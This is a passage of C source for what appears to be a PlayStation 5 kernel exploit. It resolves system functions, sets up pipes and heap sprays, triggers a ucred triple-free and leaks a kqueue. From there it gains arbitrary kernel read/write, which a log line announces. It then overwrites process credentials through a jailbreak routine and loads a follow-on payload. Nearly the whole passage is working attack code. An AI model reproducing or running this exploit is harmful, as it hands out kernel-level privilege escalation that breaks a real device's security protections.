    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_mutex_lock",     (void**)&ctx.fn_mutex_lock);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_mutex_unlock",   (void**)&ctx.fn_mutex_unlock);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_cond_init",      (void**)&ctx.fn_cond_init);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_cond_wait",      (void**)&ctx.fn_cond_wait);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "pthread_cond_broadcast", (void**)&ctx.fn_cond_broadcast);

    resolve(ctx.gadget, dlsym, LIBC_HANDLE, "calloc",             (void**)&ctx.fn_calloc);
    resolve(ctx.gadget, dlsym, LIBC_HANDLE, "free",               (void**)&ctx.fn_free);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "sceKernelJitCreateSharedMemory", (void**)&ctx.fn_jit_create);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "mmap",          (void**)&ctx.fn_mmap);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "open",          (void**)&ctx.fn_open);
    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "lseek",         (void**)&ctx.fn_lseek);

    {
        s32 nfd = (s32)CALL(&ctx, fn_open, (u64)"/dev/null", O_RDONLY, 0, 0, 0, 0);
        log_hex32(&ctx, "init: /dev/null fd=", (u32)nfd);
        if (nfd >= 0)
            CALL(&ctx, fn_close, nfd, 0, 0, 0, 0, 0);
    }
    LOG(&ctx, "init: calloc/free resolved\n");

    
    cpu_set_affinity(&ctx, MAIN_CORE);
    LOG(&ctx, "init: cpu affinity set\n");

    rtprio_thread(&ctx, 256);
    LOG(&ctx, "init: rtprio set\n");

    
    CALL(&ctx, fn_pipe, (u64)ctx.master_pipe, 0, 0, 0, 0, 0);
    LOG(&ctx, "init: master pipe created\n");

    CALL(&ctx, fn_pipe, (u64)ctx.victim_pipe, 0, 0, 0, 0, 0);
    LOG(&ctx, "init: victim pipe created\n");

    CALL(&ctx, fn_fcntl, ctx.master_pipe[0], F_SETFL, O_NONBLOCK, 0, 0, 0);
    CALL(&ctx, fn_fcntl, ctx.master_pipe[1], F_SETFL, O_NONBLOCK, 0, 0, 0);
    CALL(&ctx, fn_fcntl, ctx.victim_pipe[0], F_SETFL, O_NONBLOCK, 0, 0, 0);
    CALL(&ctx, fn_fcntl, ctx.victim_pipe[1], F_SETFL, O_NONBLOCK, 0, 0, 0);
    LOG(&ctx, "init: pipes set O_NONBLOCK\n");

    
    ctx.spray_rthdr   = (u8*)CALL(&ctx, fn_calloc, 1, UCRED_SIZE,        0, 0, 0, 0);
    ctx.leak_rthdr    = (u8*)CALL(&ctx, fn_calloc, 1, UCRED_SIZE,        0, 0, 0, 0);
    ctx.msg_hdr       = (u8*)CALL(&ctx, fn_calloc, 1, MSG_HDR_SIZE,      0, 0, 0, 0);
    ctx.msg_iov       = (u8*)CALL(&ctx, fn_calloc, MSG_IOV_NUM, IOV_SIZE, 0, 0, 0, 0);
    ctx.uio_iov_read  = (u8*)CALL(&ctx, fn_calloc, UIO_IOV_NUM, IOV_SIZE, 0, 0, 0, 0);
    ctx.uio_iov_write = (u8*)CALL(&ctx, fn_calloc, UIO_IOV_NUM, IOV_SIZE, 0, 0, 0, 0);
    ctx.dummy_buf     = (u8*)CALL(&ctx, fn_calloc, 1, 0x1000,            0, 0, 0, 0);
    for (int i = 0; i < 0x1000; i++) ctx.dummy_buf[i] = 0x41;
    ctx.tmp           = (u8*)CALL(&ctx, fn_calloc, 1, PAGE_SIZE,         0, 0, 0, 0);

    LOG(&ctx, "exploit: start\n");

    
    if (!trigger_ucred_triple_free(&ctx)) {
        LOG(&ctx, "exploit: triggerUcredTripleFree failed\n");
        cleanup(&ctx);
        return ERR_TRIPLE_FREE;
    }
    LOG(&ctx, "exploit: triggerUcredTripleFree finished\n");

    if (!leak_kqueue(&ctx)) {
        LOG(&ctx, "exploit: leakKqueue failed\n");
        cleanup(&ctx);
        return ERR_LEAK_KQUEUE;
    }
    LOG(&ctx, "exploit: leakKqueue finished\n");

    u64 fd_files     = kread_slow64(&ctx, ctx.kq_fdp);
    ctx.fdt_ofiles   = fd_files + FDT_OFILES_OFFSET;
    log_hex64(&ctx, "exploit: fdt_ofiles=", ctx.fdt_ofiles);

    u64 master_rpipe_file = kread_slow64(&ctx, ctx.fdt_ofiles +
                                         (u64)ctx.master_pipe[0] * FILEDESCENT_SIZE);
    log_hex64(&ctx, "exploit: master_rpipe_file=", master_rpipe_file);

    u64 victim_rpipe_file = kread_slow64(&ctx, ctx.fdt_ofiles +
                                         (u64)ctx.victim_pipe[0] * FILEDESCENT_SIZE);
    log_hex64(&ctx, "exploit: victim_rpipe_file=", victim_rpipe_file);

    u64 master_rpipe_data = kread_slow64(&ctx, master_rpipe_file + 0x00);
    log_hex64(&ctx, "exploit: master_rpipe_data=", master_rpipe_data);

    u64 victim_rpipe_data = kread_slow64(&ctx, victim_rpipe_file + 0x00);
    log_hex64(&ctx, "exploit: victim_rpipe_data=", victim_rpipe_data);

    u8 master_pipebuf[PIPEBUF_SIZE];
    PUT32(master_pipebuf, 0x00, 0);
    PUT32(master_pipebuf, 0x04, 0);
    PUT32(master_pipebuf, 0x08, 0);
    PUT32(master_pipebuf, 0x0C, PAGE_SIZE);
    PUT64(master_pipebuf, 0x10, victim_rpipe_data);
    kwrite_slow(&ctx, master_rpipe_data, master_pipebuf, PIPEBUF_SIZE);

    LOG(&ctx, "exploit: arbitrary r/w achieved\n");
    
    ctx.kqex_go = 0;
    CALL(&ctx, fn_free, (u64)ctx.kqex_args, 0, 0, 0, 0, 0);
    LOG(&ctx, "exploit: kqex threads released\n");

    for (int i = 0; i < NULL_FD_COUNT; i++) {
        if (ctx.null_fds[i] >= 0) {
            CALL(&ctx, fn_close, ctx.null_fds[i], 0, 0, 0, 0, 0);
            ctx.null_fds[i] = -1;
        }
    }
    LOG(&ctx, "exploit: closed reamining /dev/null fds\n");

    fhold(&ctx, fget(&ctx, ctx.master_pipe[0]));
    fhold(&ctx, fget(&ctx, ctx.master_pipe[1]));
    fhold(&ctx, fget(&ctx, ctx.victim_pipe[0]));
    fhold(&ctx, fget(&ctx, ctx.victim_pipe[1]));

    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[0]]);
    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[1]]);
    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[2]]);
    
    ctx.allproc = find_allproc(&ctx);
    log_hex64(&ctx, "exploit: allproc=",  ctx.allproc);
    log_hex64(&ctx, "exploit: curproc=",  ctx.curproc);

    {
        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
        log_hex64(&ctx, "exploit: p_ucred=",      p_ucred);
        log_hex32(&ctx, "exploit: cr_uid=",        kread32(&ctx, p_ucred + 0x04));
        log_hex64(&ctx, "exploit: cr_sceAuthId=",  kread64(&ctx, p_ucred + 0x58));
    }

    ps5_jailbreak(&ctx);

    {
        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
        log_hex32(&ctx, "exploit: post cr_uid=",       kread32(&ctx, p_ucred + 0x04));
        log_hex64(&ctx, "exploit: post cr_sceAuthId=", kread64(&ctx, p_ucred + 0x58));
    }

    cleanup(&ctx);

    {
        aio_ctx_t aio = {0};
        aio_prepare(&ctx, (const char*)arg4, &aio);
        if (aio.entry)
            aio_run(&ctx, &aio);
    }

    LOG(&ctx, "exploit: done\n");
    return 0;
}